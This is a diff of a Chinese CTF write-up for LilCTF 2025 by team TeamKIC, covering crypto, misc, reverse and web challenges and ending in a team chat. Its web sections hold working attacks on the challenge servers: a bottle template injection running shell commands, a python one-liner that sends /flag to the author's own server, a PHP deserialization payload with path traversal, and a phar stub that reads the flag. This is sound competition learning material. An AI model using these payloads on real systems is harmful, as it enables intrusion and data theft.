@@ -1,6 +1,28 @@
-<!-- {% raw %} -->
-# LilCTF 2025 非官方题解暨吐槽（Ishisashi 篇）
+# LilCTF 2025 非官方题解暨吐槽（TeamKIC 篇）
+这里是 TeamKIC 的 LilCTF 2025 WP！本次比赛中，TeamKIC 得 2062 分，位于第 33 名。
+
+队名来源于成员名的首字母，外加谐音鼓点中的 Kick：
+- Klekta（昌九）
+- Ishisashi
+- Ctone（CT）
+
+## \[misc\] 是谁没有阅读参赛须知？
+解题者：KLEk
+
+提交时间：2025-08-15 12:34:08 (UTC+8)
+
+完全没什么可说的，我只是做了“是谁没有阅读参赛须知”这么一道题。甚至某种意义上我还是拖后腿的那位。
+
+flag就在题干那里，我看见了就复制、点提交，这有什么可说的呢？
+```
+所有题目 flag 字符串的形式为 LILCTF{Me4n1ngFu1_w0rDs}，请提交包含 LILCTF{} 的完整 flag。
+```
+
 ## \[crypto\] ez_math
+解题者：Ishisashi
+
+提交时间：2025-08-15 15:19:09 (UTC+8)
+
 令 $A=\left\[\begin{matrix}v\_{11}&v\_{12}\cr v\_{21}&v\_{22}\end{matrix}\right\]$，则：
 
 $\det A=v\_{11}v\_{22}-v\_{12}v\_{21}$
@@ -48,6 +70,10 @@ LILCTF{It_w4s_the_be5t_of_times_1t_wa5_the_w0rst_of_t1me5}
 ![](img/IMG20250815141655.jpg)
 
 ## \[crypto\] mid_math
+解题者：Ishisashi
+
+提交时间：2025-08-15 16:28:32 (UTC+8)
+
 这次可是五阶方阵，不能再爆算了。
 
 令 $T=\left\[\begin{matrix}a&0&0&0&0\cr0&b&0&0&0\cr0&0&c&0&0\cr0&0&0&d&0\cr0&0&0&0&0\end{matrix}\right\]$，则：
@@ -96,7 +122,67 @@ LILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}
 ### Omake：手稿
 ![](img/IMG20250815161334.jpg)
 
+## \[web\] ez_bottle
+解题者：RenzukaCtone
+
+提交时间：2025-08-15 16:50:38 (UTC+8)
+
+分析 .py。POST /upload 上传 ZIP 文件，远程端会将其解压至以生成的 MD5 命名的目录内。
+
+此后 GET /view/<md5>/<filename>，脚本会检测有害字符(串)，若检测通过将执行 template(<文件内容>)。
+
+诸如 {} os eval open 等关键词都无法通过检测。搜索 bottle.template 得知可以使用 % 开头来解释执行代码。exec 则用 subprocess.run 代替。
+
+```python
+% import subprocess
+% subprocess.run(["cat /flag | tee 233.txt"], shell=True)
+% subprocess.run('cp 233.txt "./static/233.txt"', shell=True)
+```
+
+存为文本打包上传执行，最后 GET /static/233.txt 得到 flag。
+
+## \[misc\] v我50(R)MB
+解题者：RenzukaCtone
+
+提交时间：2025-08-15 17:09:07 (UTC+8)
+
+访问靶机，F12，Chrome 上是可以显示一部分图像的。
+
+文件头是 png，猜测是 Content-Length 导致传输提前终止。询问 ChatGPT 后，尝试进行分块传输：
+
+![](img/Snipaste_2025-08-15_17-14-58.png)
+
+```python
+import socket
+
+host = 'challenge.xinshi.fun'
+port = 37292
+request = b"GET /api/file/download/72ddc765-caf6-43e3-941e-eeddf924f8df HTTP/1.1\r\nHost: challenge.xinshi.fun\r\nConnection: close\r\n\r\n"
+filename = "output.bin"
+
+sock = socket.socket()
+sock.connect((host, port))
+sock.sendall(request)
+
+with open(filename, "wb") as f:
+    while True:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        f.write(chunk)
+
+sock.close()
+```
+
+删掉 output.bin 中 PNG 文件头之前的内容，得到完整图片。
+
+![](img/output.png)
+
 ## \[reverse\] 1'M no7 A rO6oT
+解题者：Ishisashi
+
+提交时间：2025-08-15 19:14:11 (UTC+8)
+
 我愿称此题为俄罗斯套娃（
 
 直接按钓鱼网页的按钮，复制代码：
@@ -212,6 +298,10 @@ LILCTF{BE_VIGlLAN7_a6@lN$7_ph15HING}
 ```
 
 ## \[crypto\] Linear
+解题者：Ishisashi
+
+提交时间：2025-08-15 21:02:20 (UTC+8)
+
 强的不是我，是 Mathematica（
 ```Python
 import pyperclip
@@ -246,7 +336,73 @@ LILCTF{2d36efef-9ee5-4dc9-ba7e-179b219837d0}
 ### Omake
 ![](img/cd3ed38874ec2040fc3cd6728ab21b09.png)
 
+## \[web\] Ekko_note
+解题者：RenzukaCtone
+
+提交时间：2025-08-15 23:57:32 (UTC+8)
+
+分析 .py。目标很明确，要任意执行命令，需要改掉时间 API 让时间到 2066 年之后，只有 admin 能改这个 API。
+
+脚本给了很明显的提示
+
+```python
+# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。
+# 反正整个程序没有一个地方用到random库。应该没有什么问题。
+import random
+random.seed(SERVER_START_TIME)
+
+# 选哪个UUID版本好呢，好头疼 >_<
+# UUID v8吧，看起来版本比较新
+token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧
+reset_token = PasswordResetToken(user_id=user.id, token=token)
+db.session.add(reset_token)
+db.session.commit()
+# TODO：写一个SMTP服务把token发出去
+flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')
+```
+
+很难不注意到这里。那应该是要从这个 UUID v8 入手。装了 python 3.14 rc2 来测试数值，每次的结果都不一样。
+
+啊，那肯定和那个 random.seed() 有关啦。在靶机上随便注册一个账户后就能收到 SERVER_START_TIME。
+
+在恢复 admin 密码页面用生成的 UUID 就可以改密码了。
+
+![](img/Snipaste_2025-08-15_22-29-29.png)
+
+靶机可以出网，拿自己的主机开了个 HTTP 服务，响应固定的 JSON 数据。
+
+然后开始任意执行命令拿 flag。执行命令是看不到输出的。最开始用 cat /flag > /www/index.php 再刷新页面，发现行不通，可能 bottle 提前把这些 templates 读到内存里了吧。
+
+用了不少办法，感觉缺很多基本工具 (curl 等等)，最后想到靶机后端强大的 python。
+
+```python
+python -c "import os;import http.client;conn = http.client.HTTPConnection('{我的服务器}');str=open('/flag', 'r', encoding='utf-8').read();conn.request('POST', '/upload', body=str)"
+```
+
+```JavaScript
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+app.post('/', (req, res) => {
+  console.log('Received data:', req.body);
+  res.send('Data received');
+});
+
+app.listen(20098, () => {
+  console.log('Server is listening on port 20098');
+});
+
+```
+
+![](img/Snipaste_2025-08-15_23-57-25.png)
+
 ## \[crypto\] Space Travel
+解题者：Ishisashi
+
+提交时间：2025-08-16 12:48:51 (UTC+8)
+
 不妨把 key 和 nonce 看成两个八百维 GF(2) 向量，位与结果中 1 的个数的奇偶也就成了两个向量的点积。于是得到了 600 个方程。
 
 然后再来看 vecs 的特征。元素都是 16 位二进制数，但却只有 4096 个，说明这些元素内部一定有冗余信息。稍微试了下发现，截取中间 12 位（也就是左边和右边各去掉 2 位）的话就是无重复的，大胆猜测左右两侧的位是中间各位的简单异或。
@@ -283,6 +439,10 @@ LILCTF{Un1qUe_s0luti0n_1N_sUbSp4C3!}
 ↑并非惟一
 
 ## \[misc\] 提前放出附件
+解题者：Ishisashi
+
+提交时间：2025-08-16 15:54:24 (UTC+8)
+
 简直是 [GeekGame 3rd「基本功」](https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob24-password)原题复现。
 
 随便压个 tar 看看特征，然后丢 bkcrack。
@@ -312,7 +472,18 @@ LILCTF{Z1pCRyp70_1s_n0t_5ecur3}
 
 ![](img/QQ图片20250816223853.png)
 
+### Omake：CT 视角
+下载附件，是一个 ZipCrypto Store 加密的压缩包，里面有一个文件 flag.tar。
+
+查询 tar 文件结构，wow前一百个字节都是文件名(tar 包内的文件)，那我想总不会真的会放那么长文件名的文件吧，于是尝试对 80 多偏移的地方使用 bkcracker，HEX 全都是 00，几分钟后得到 flag。
+
+(来不及写了，嗯反正这题 flag 不是我提交的)
+
 ## \[pwn\] 签到
+解题者：Ishisashi
+
+提交时间：2025-08-16 16:42:36 (UTC+8)
+
 很老掉牙的栈溢出，但我却是第一次做，找教程现学的。毕竟我没有特别训练过 CTF 技能，都是打完后就不管了。
 
 用 IDA 反汇编：
@@ -402,6 +573,10 @@ LILCTF{03803481-0c2b-4d88-92fe-622984719f82}
 ……害我没去做真·签到题「是谁没有阅读参赛须知？」，好在昌九发现了那题。「难度：签到」倒是所言不虚，不过这是对有 pwn 基础的人而言的。
 
 ## \[crypto\] baaaaaag
+解题者：Ishisashi
+
+提交时间：2025-08-16 19:56:59 (UTC+8)
+
 这是很典型的子集和问题。其密度大致是 72/90=0.8，可以采用 LLL-BKZ 算法。
 ```Python
 from fpylll import IntegerMatrix, LLL, BKZ
@@ -444,6 +619,10 @@ LILCTF{M4ybe_7he_brut3_f0rce_1s_be5t}
 ![](img/QQ图片20250818180013.png)
 
 ## \[misc\] PNG Master
+解题者：Ishisashi
+
+提交时间：2025-08-16 20:44:26 (UTC+8)
+
 IEND 后藏着一串 Base64：
 ```
 6K6p5L2g6Zq+6L+H55qE5LqL5oOF77yM5pyJ5LiA5aSp77yM5L2g5LiA5a6a5Lya56yR552A6K+05Ye65p2lZmxhZzE6NGM0OTRjNDM1NDQ2N2I=
@@ -487,6 +666,7 @@ Y0u_4r3_M
 与文件名xor
 ```
 _「哦对了，我可不认为扩展名也是文件名的一部分。」_
+
 那么打开 secret.bin 看看罢。
 ```
 15090215564E455454415643455054405012455C551750124655571751434401
@@ -502,7 +682,7 @@ as7er_in_PNG}
 ```
 LILCTF{Y0u_4r3_Mas7er_in_PNG}
 ```
-### Omake
+### Omake 1
 好基友 CT 看到 secret.bin 的「VNETTAVCEPT」，误以为是 Vigenère 密码，从而回想起被[新穷铁道](https://github.com/PKU-GeekGame/geekgame-4th/blob/master/official_writeup/misc-erail)支配的恐惧。
 
 ![](img/6ef3652c451d31ec8ecf65966dd74eb1.png)
@@ -511,7 +691,40 @@ LILCTF{Y0u_4r3_Mas7er_in_PNG}
 
 ![](img/eeee13a2fb265e6570d5708b23308afc.png)
 
+### Omake 2：CT 视角
+zsteg 找的隐写的 flag2(base64) 和 zlib。后面就不会了，因为注意不到那个 hint.txt。。
+
+(非本人提交 flag)
+
+## \[reverse\] Qt_Creator
+解题者：RenzukaCtone
+
+提交时间：2025-08-16 23:09:33 (UTC+8)
+
+不会 pwn。直接把主程序的 HEX 拿去分析文本，找到这些：
+
+![](img/Snipaste_2025-08-18_15-39-32.png)
+
+嗯神秘字符串呢，那就试着解解看吧。
+
+与 `LILCTF{` 对照着看，很快就能发现规律：密文每个字符从头开始加 1，下一个字符减 1，依次计算就能得到 flag。
+
+```
+KJKDSGzR6`bsd5s1q`0t^wdsx`b1mw2oh4mu|
+LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}
+```
+
+搜这个 login 也很快。
+
+![](img/Snipaste_2025-08-16_23-28-07.png)
+
+![](img/Snipaste_2025-08-16_23-10-34.png)
+
 ## \[reverse\] ARM ASM
+解题者：Ishisashi
+
+提交时间：2025-08-17 01:11:54 (UTC+8)
+
 首先看一眼 MainActivity，发现了编码后的 Flag。
 ```
 KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S
@@ -608,7 +821,82 @@ LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}
 
 ![](img/QQ图片20250818180225.png)
 
+## \[web\] Your Uns3r
+解题者：RenzukaCtone
+
+提交时间：2025-08-17 04:08:04 (UTC+8)
+
+题目给了源码，最下面的反序列函数可以用于创建对象。那我们要创建一个 admin 账户！
+
+"admin" 那里没有严格等于，真是太好啦，那我们就让创建的账户 admin 字段直接为 true(bool)。绕过 admin 那后面的 `Access":` 就不用管了。
+
+本地 PHP 里把对象构造好，调用 serialize() 之后 POST 过去。Payload:
+
+```
+a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:72:"O:6:"Access":2:{s:9:"\0*\0prefix";s:1:"/";s:9:"\0*\0suffix";s:8:"/../flag";}";}}
+```
+
+这样就可以 include /lilctf/../flag 把 flag 显示出来。
+
+本地 PHP 8.4.11 测试时，直接传对象的序列化是可以按预期工作的，但到靶机上就不行。根据响应得知靶机 PHP 版本为 5.6.40。
+
+查到资料：https://bbs.kanxue.com/thread-271714.htm
+
+![](img/Snipaste_2025-08-18_15-19-47.png)
+
+那就可以把对象包在数组里让其强制进行垃圾回收，以执行 __destruct() 函数。
+
+prefix 与 suffix 为 protected，序列化后前面会加上 \0\*\0，一开始还以为是空格。。那似乎没法用 Restfox 做了，用脚本进行 POST。
+
+```JavaScript
+const http = require('http');
+//const payload = 'a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:102:"O:6:"Access":2:{s:9:"\0*\0prefix";s:36:"data:text/plain,<?php phpinfo()?> /*";s:9:"\0*\0suffix";s:2:"*/";}";}}';
+//const payload = 'a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:102:"O:6:"Access":2:{s:9:"\0*\0prefix";s:38:"file:///usr/share/php/%70earcmd.php?a=";s:9:"\0*\0suffix";s:0:"";}";}}';
+//const payload = 'a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:79:"O:6:"Access":2:{s:9:"\0*\0prefix";s:2:"./";s:9:"\0*\0suffix";s:13:"/../index.php";}";}}';
+//const payload = 'a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:98:"O:6:"Access":2:{s:9:"\0*\0prefix";s:34:"php://filter/resource=index.php\x26a=";s:9:"\0*\0suffix";s:0:"";}";}}';
+const payload = 'a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:72:"O:6:"Access":2:{s:9:"\0*\0prefix";s:1:"/";s:9:"\0*\0suffix";s:8:"/../flag";}";}}';
+
+const payloadBuffer = Buffer.from(payload, 'binary');
+
+// 自定义 boundary
+const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
+
+// 构造 multipart/form-data 请求体
+let body = Buffer.concat([
+  Buffer.from(`--${boundary}\r\n`),
+  Buffer.from(`Content-Disposition: form-data; name="user"\r\n\r\n`),
+  payloadBuffer,
+  Buffer.from(`\r\n--${boundary}--\r\n`)
+]);
+
+const options = {
+  hostname: 'challenge.xinshi.fun',
+  port: 38966,
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': `multipart/form-data; boundary=${boundary}`,
+    'Content-Length': body.length
+  }
+};
+
+const req = http.request(options, (res) => {
+  let data = '';
+  res.on('data', chunk => data += chunk);
+  res.on('end', () => console.log('Response:', data));
+});
+
+req.write(body);
+req.end();
+```
+
+![](img/Snipaste_2025-08-17_04-14-01.png)
+
 ## \[reverse\] obfusheader.h
+解题者：Ishisashi
+
+提交时间：2025-08-17 20:20:10 (UTC+8)
+
 随手输个短点的东西，发现 F3C4D9DF8EC9DCD0D593DDC696C3D7D69AC8D4D2CCCBE1C1 一步步变成了 596F757220666C616720697320746F6F2073686F72742100。
 
 _「気がつけば今は 目の前で転がっているんだ」_
@@ -698,6 +986,9 @@ LILCTF{Wh@T_lS_D@t@FLOW_c4N_1t_8E_E4t3N}
 ![](img/QQ图片20250818180513.png)
 
 ## \[misc\] 反馈调查
+解题者：Ishisashi
+
+提交时间：2025-08-17 20:27:19 (UTC+8)
 ```
 本题的 flag 是：LILCTF{F4l1En_l3aV3s_Re7urN_T0_tHe1R_rO0tS}
 ```
@@ -705,6 +996,43 @@ LILCTF{Wh@T_lS_D@t@FLOW_c4N_1t_8E_E4t3N}
 LILCTF{F4l1En_l3aV3s_Re7urN_T0_tHe1R_rO0tS}
 ```
 其实我不应该交这个 Flag 的。原本打算留给昌九提交，但脑子还是没有跟上手。十分后悔。
+
+## \[web\] php_jail_is_my_cry
+解题者：RenzukaCtone
+
+在本题上花了最多时间，最后也没有解出来。
+
+构造 phar 并进行 gzip 压缩可以绕过 php 检测，但怎么 jail 就不会了。
+
+```php
+<?php
+$pharFile = __DIR__ . '/app11.phar';
+if (file_exists($pharFile)) unlink($pharFile);
+
+$phar = new Phar($pharFile);
+
+$phar->buildFromDirectory(__DIR__ . '/project');
+
+$stub = <<<STUB
+<?php
+    $ch = curl_init("file:///flag");
+    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
+    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $data = curl_exec($ch);
+	echo $data;
+
+__HALT_COMPILER(); ?>
+STUB;
+
+$phar->setStub($stub);
+
+echo "Built compressed: $pharFile\n";
+```
+
+![](img/Snipaste_2025-08-17_22-03-06.png)
+
+好累啊唉唉唉
 
 ## Omake：调查问卷
 ![](img/问卷%201.png)
@@ -719,4 +1047,91 @@ LILCTF{F4l1En_l3aV3s_Re7urN_T0_tHe1R_rO0tS}
 
 ## Omake：二维码
 ![](img/dab837f3797acd5061a9596207ea2a46.png)
-<!-- {% endraw %} -->
+
+## Omake：队名
+![](img/a37f94ff84e6322c97e33202b6db98fb.png)
+
+## Omake：后日谈
+RenzukaCtone：这次 CTF，虽然一开始说是准备摆烂，最后为了解题连觉都没怎么睡（在家就可以凌晨解题了）。现在回想，只是自己转弯太慢，大部分时间都在进行无意义的尝试。
+
+Ishisashi：那我又何尝不是呢？问大语言模型都还没有自己 Google 好用，代数题更是本来能秒做却拖拖拉拉地在乱做呢。
+
+KLEk：不管怎么说，能做得出就算是好事吧？
+
+RenzukaCtone：最后您佬也是解出了全部 math 呢，佩服佩服。
+
+Ishisashi：强的不是我，是 Mathematica（
+
+Ishisashi：CT 也解决了很多我不会的题呢，比如那个 V 我 50，当时我还在和昌九讨论，CT 就做出来了。
+
+KLEk：啊对！当时我们还在焦头烂额，回过头却看见CT已经提交完flag了
+
+RenzukaCtone：哎呀，那题也是大语言模型给出了关键信息。（大语言模型在本次比赛中最有用的一次）
+
+Ishisashi：我和昌九也在用大语言模型啊……（
+
+RenzukaCtone：不过赛后我也学到一招 --ignore-content-length
+
+Ishisashi：这个确实，我还在教昌九用 curl，结果自己都不会用 curl 属于是（（（（
+
+Ishisashi：更不用说 Windows 10 以来其实自带个 curl.exe，我还让昌九在网上下一个（（（（
+
+![](img/QQ图片20250820152829.png)
+
+RenzukaCtone：←cmd 用家
+
+Ishisashi：只能说这次比赛对新手也不是很友好，导致昌九有了不好的体验。不过昌九做出了真·签到，这是我不及的地方，我还在死磕 pwn 签到呢（（（
+
+KLEk：关键那个题名就挺有暗示性的来着（
+
+RenzukaCtone：唉没有真·基本功。我也只能看看 misc, web，其它的完全磕不动。
+
+KLEk：我甚至连这些都很费劲（（（
+
+RenzukaCtone：我也想把那道 pwn 签到做出来，但一点基础没有果然还是很费劲。
+
+Ishisashi：感觉那个签到可以问大语言模型，虽然我其实是直接把代码丢去 Google 找到的教程。
+
+Ishisashi：数学题中 ez_math 和 mid_math 算是吃了一点线性代数基础的老本，感觉刚学过线性代数的人比我更会做。Linear 纯纯是 MMA 强，不是我强。baaaaaag 是大语言模型（给了我「子集和」的关键词）外加现搜的，看了会论文，却找了很久良好的矩阵构造。Space Travel 才是我比较得意的题目，做成了找规律题，但是从其它选手的 WP 来看，我的方向完全是歪打正着呢（
+
+Ishisashi：pwn 除了签到就是爆零了……唉，一直都不太会 pwn
+
+Ishisashi：reverse 感觉还是比较可惜，Oh_My_Uboot 那题如果让昌九在 qemu 跑跑的话，我说不定就做出来了。
+
+RenzukaCtone：可能得专门去做训练题吧
+
+Ishisashi：「提前放出附件」这题没拿到一血，甚至三血也晚了 11 秒，真是可惜。当时主要还是做错题了，往 PNG Master 上耗；外加要教给昌九一些知识，忙不过来。
+
+RenzukaCtone：神奇，这道题最后也只有 41 解出
+
+Ishisashi：对啊，明明算是 GeekGame 原题复现呢……甚至 GeekGame 那题压的是 pcap，比 tar 要难一些罢！
+
+RenzukaCtone：感觉比 PNG Master 简单多啦
+
+Ishisashi：说到 PNG Master……CT 是不是以为那是新穷铁道来着（（
+
+RenzukaCtone：有过这样的想法；毕竟我只盯着那 32 字节含有较多可读字符的文件看
+
+RenzukaCtone：没有别的线索，只能尝试往各个密码上套，当然也包括 Vigenere
+
+RenzukaCtone：（哪来的密钥
+
+Ishisashi：毕竟这一回可没有列车车次了（笑）
+
+KLEk：不管怎么样，大家都在这场夺旗赛上得到了成长吧（笑）虽然我是最没资格说这种话的
+
+Ishisashi：那毕竟也是这比赛有点新手不友好啦……像 GeekGame 和 Hackergame，是有分阶段 Flag 的，做出一部分就可以得一定分。
+
+Ishisashi：本次比赛中 ez_math 和 mid_math 两题就类似于这种模式，但其它题目就没见到有。
+
+RenzukaCtone：喜欢分阶段 flag
+
+Ishisashi：虽然没进前 20 还是有些遗憾，总之我们队还是进了前 40 的！
+
+Ishisashi：就如昌九所说，得到成长才是最重要的。这并不只是技术上的，团队协作的经验也很重要。
+
+Ishisashi：没拿到一血，所以和昌九吵了一架……这种事情以后还是不要有啦！
+
+Ishisashi：LilCTF 2025 TeamKIC 座谈，到此结束！撒花
+
+![](img/7f572d56f2065ff12ce47dfdccb08af3.png)
